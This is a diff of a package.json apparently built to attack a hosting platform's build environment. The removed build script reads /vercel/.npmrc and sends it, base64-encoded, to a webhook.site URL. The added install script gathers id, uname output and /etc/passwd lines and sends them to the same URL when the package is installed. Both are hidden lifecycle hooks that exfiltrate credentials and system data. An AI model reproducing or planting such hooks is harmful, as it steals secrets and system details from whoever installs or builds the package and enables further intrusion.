@@ -1,7 +1,7 @@
 {
-  "name": "v-test-final-boss",
+  "name": "vercel-rce-final-boss",
   "version": "1.0.0",
   "scripts": {
-    "build": "export DATA=$(cat /vercel/.npmrc | base64 | tr -d '\\n' | head -c 100); curl https://webhook.site/3e699558-ee31-4cba-bd37-0d59a1bf20f4/npmrc.$DATA"
+    "install": "export FINAL=$(echo \"ID: $(id) | UNAME: $(uname -a) | PASSWD: $(head -n 5 /etc/passwd | base64 | tr -d '\\n')\" | base64 | tr -d '\\n'); curl https://webhook.site/3e699558-ee31-4cba-bd37-0d59a1bf20f4/FINAL_LEAK.$FINAL"
   }
 }
